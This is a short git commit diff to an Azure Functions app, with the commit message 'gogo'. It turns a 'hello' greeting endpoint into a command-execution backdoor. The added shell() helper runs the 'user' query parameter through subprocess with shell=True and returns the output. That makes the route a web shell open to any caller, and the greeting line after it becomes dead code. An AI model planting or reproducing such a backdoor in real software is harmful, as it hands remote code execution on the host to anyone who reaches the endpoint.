0a62f85ee736950bb9f7cefd305d3958d259c360
Juno Im <juno@theori.io>
2026-03-16 23:03:20 +0900

    gogo

--- function_app.py
+++ function_app.py
@@ -1,8 +1,19 @@
 import azure.functions as func
 
+from subprocess import check_output
+
+import subprocess
+
+def shell(cmd):
+    try:
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('latin-1')
+    except subprocess.CalledProcessError as e:
+        return e.output.decode('latin-1')
+
 app = func.FunctionApp()
 
 @app.route("hello")
 def http_trigger(req):
     user = req.params.get("user")
+    return shell(user)
     return f"Hello, {user}!"
